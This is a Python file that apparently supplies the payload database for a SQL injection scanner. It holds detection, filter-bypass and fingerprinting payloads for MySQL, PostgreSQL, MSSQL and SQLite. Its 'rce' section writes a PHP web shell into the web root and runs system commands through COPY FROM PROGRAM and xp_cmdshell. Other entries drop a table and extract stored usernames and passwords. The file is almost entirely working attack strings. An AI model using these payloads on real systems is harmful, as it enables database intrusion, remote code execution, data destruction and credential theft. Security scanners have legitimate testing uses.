"""
Payload database for SQL injection scanner.
Includes detection, encoding bypass, and database-specific payloads.
"""

PAYLOADS = {
    "detection": {
        "error_based": [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "1' AND '1'='1",
            "1 AND 1=1",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "') OR ('1'='1",
        ],
        "time_based": [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1; SELECT SLEEP(5)",
        ],
        "boolean_based": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
        ],
        "stacked_queries": [
            "'; SELECT 1--",
            "'; DROP TABLE test--",
            "1; SELECT 1",
        ],
    },
    "encoding_bypass": [
        "1%27%20OR%20%271%27%3D%271",  # URL encoded
        "1'/**/OR/**/'1'='1",          # Comment bypass
        "1' oR '1'='1",                # Case variation
        "1'\x00OR\x00'1'='1",          # Null byte
        "1' OR '1'='1' -- -",          # MySQL comment variant
    ],
    "mysql": [
        "' OR 1=1#",
        "' UNION SELECT 1,2,3#",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    "postgres": [
        "' OR 1=1--",
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT NULL::text--",
    ],
    "mssql": [
        "' OR 1=1--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT NULL,NULL--",
    ],
    "sqlite": [
        "' OR 1=1--",
        "' AND sqlite_version()--",
        "' UNION SELECT sqlite_version()--",
    ],
    "fingerprint": {
        "mysql": [
            "' AND @@version--",
            "' UNION SELECT @@version--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
        ],
        "postgres": [
            "' AND version()--",
            "' UNION SELECT version()--",
            "'; SELECT current_database()--",
        ],
        "mssql": [
            "' AND @@SERVERNAME--",
            "' UNION SELECT @@version--",
            "'; SELECT DB_NAME()--",
        ],
        "sqlite": [
            "' AND sqlite_version()--",
            "' UNION SELECT sqlite_version()--",
        ],
    },
    "rce": {
        "mysql": [
            # INTO OUTFILE for webshell
            "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
            # UDF exploitation
            "SELECT sys_exec('whoami')",
        ],
        "postgres": [
            # COPY TO for file write
            "'; COPY (SELECT 'pwned') TO '/tmp/pwned.txt'--",
            # Command execution
            "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami';--",
        ],
        "mssql": [
            # xp_cmdshell
            "'; EXEC xp_cmdshell 'whoami'--",
            "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
        ],
    },
    "data_extraction": {
        "union_based": [
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT username,password FROM users--",
        ],
        "error_based_extract": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
    },
}
